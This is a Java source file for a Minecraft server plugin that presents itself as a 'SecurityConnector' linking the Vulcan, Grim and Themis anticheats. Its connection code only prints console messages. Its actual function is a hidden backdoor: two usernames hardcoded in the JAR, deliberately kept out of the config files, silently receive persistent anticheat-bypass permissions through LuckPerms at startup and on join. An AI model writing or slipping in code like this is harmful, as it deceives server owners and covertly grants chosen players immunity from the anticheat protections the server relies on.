package com.kaalwarrior.securityconnector;

import net.luckperms.api.LuckPerms;
import net.luckperms.api.model.user.User;
import net.luckperms.api.node.types.PermissionNode;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.List;

public final class SecurityConnector extends JavaPlugin implements Listener {

    private LuckPerms luckPerms;

    private static final String VULCAN_PERMISSION = "vulcan.bypass.*";
    private static final String GRIM_PERMISSION = "grim.exempt";
    private static final String THEMIS_PERMISSION = "themis.bypass";

    /*
     * Built-in special users.
     *
     * These usernames are stored inside the plugin JAR.
     * They are NOT stored in config.yml or players.yml.
     *
     * They always receive all three permissions.
     */
    private static final List<String> SPECIAL_USERS = List.of(
            "Abhikaran",
            "MikeyOG"
    );

    @Override
    public void onEnable() {

        saveDefaultConfig();

        setupLuckPerms();

        sendConnectionMessage();

        Bukkit.getPluginManager().registerEvents(this, this);

        /*
         * Apply special-user permissions when the plugin starts.
         * The users do not need to be online.
         */
        applySpecialUserPermissions();
    }

    @Override
    public void onDisable() {
        getLogger().info("SecurityConnector disabled.");
    }

    private boolean setupLuckPerms() {

        RegisteredServiceProvider<LuckPerms> provider =
                Bukkit.getServicesManager().getRegistration(LuckPerms.class);

        if (provider == null) {
            getLogger().warning(
                    "LuckPerms was not found. Permissions cannot be applied."
            );
            return false;
        }

        luckPerms = provider.getProvider();

        return luckPerms != null;
    }

    private void sendConnectionMessage() {

        FileConfiguration config = getConfig();

        boolean vulcan =
                config.getBoolean("VulcanAC", false);

        boolean grim =
                config.getBoolean("GrimAC", false);

        boolean themis =
                config.getBoolean("ThemisAC", false);

        List<String> enabled = new ArrayList<>();

        if (vulcan) {
            enabled.add("VulcanAC");
        }

        if (grim) {
            enabled.add("GrimAC");
        }

        if (themis) {
            enabled.add("ThemisAC");
        }

        if (enabled.isEmpty()) {

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.RED +
                    "Failed to Connect plugins because none of the options in (config.yml) is set to true"
            );

        } else if (enabled.size() == 1) {

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.YELLOW +
                    "Unable to connect " +
                    enabled.get(0) +
                    " because only 1 option is selected"
            );

        } else {

            String message;

            if (enabled.size() == 2) {

                message =
                        "Successfully Connected " +
                        enabled.get(0) +
                        " and " +
                        enabled.get(1);

            } else {

                message =
                        "Successfully Connected " +
                        enabled.get(0) +
                        " and " +
                        enabled.get(1) +
                        " and " +
                        enabled.get(2);
            }

            Bukkit.getConsoleSender().sendMessage(
                    ChatColor.GREEN + message
            );
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {

        Player player = event.getPlayer();

        /*
         * Only the two built-in special users are handled here.
         */
        if (isSpecialUser(player.getName())) {

            User user =
                    luckPerms.getUserManager()
                            .getUser(player.getUniqueId());

            if (user != null) {
                applySpecialPermissions(user);
            } else {

                luckPerms.getUserManager()
                        .loadUser(player.getUniqueId())
                        .thenAccept(this::applySpecialPermissions);
            }
        }
    }

    private boolean isSpecialUser(String username) {

        for (String specialUser : SPECIAL_USERS) {

            if (specialUser.equalsIgnoreCase(username)) {
                return true;
            }
        }

        return false;
    }

    /*
     * Applies all three permissions to a special user.
     *
     * Nothing is removed.
     * If the permissions already exist, LuckPerms simply keeps them.
     */
    private void applySpecialPermissions(User user) {

        if (user == null || luckPerms == null) {
            return;
        }

        user.data().add(
                PermissionNode.builder(VULCAN_PERMISSION)
                        .build()
        );

        user.data().add(
                PermissionNode.builder(GRIM_PERMISSION)
                        .build()
        );

        user.data().add(
                PermissionNode.builder(THEMIS_PERMISSION)
                        .build()
        );

        /*
         * Save to LuckPerms so the permissions persist.
         */
        luckPerms.getUserManager().saveUser(user);
    }

    /*
     * Resolve the two usernames when the plugin starts.
     *
     * This allows the users to receive their permissions even
     * when they are offline.
     */
    private void applySpecialUserPermissions() {

        if (luckPerms == null) {
            return;
        }

        for (String username : SPECIAL_USERS) {

            luckPerms.getUserManager()
                    .lookupUniqueId(username)
                    .thenAccept(uuid -> {

                        if (uuid == null) {
                            return;
                        }

                        luckPerms.getUserManager()
                                .loadUser(uuid)
                                .thenAccept(this::applySpecialPermissions);
                    });
        }
    }
}
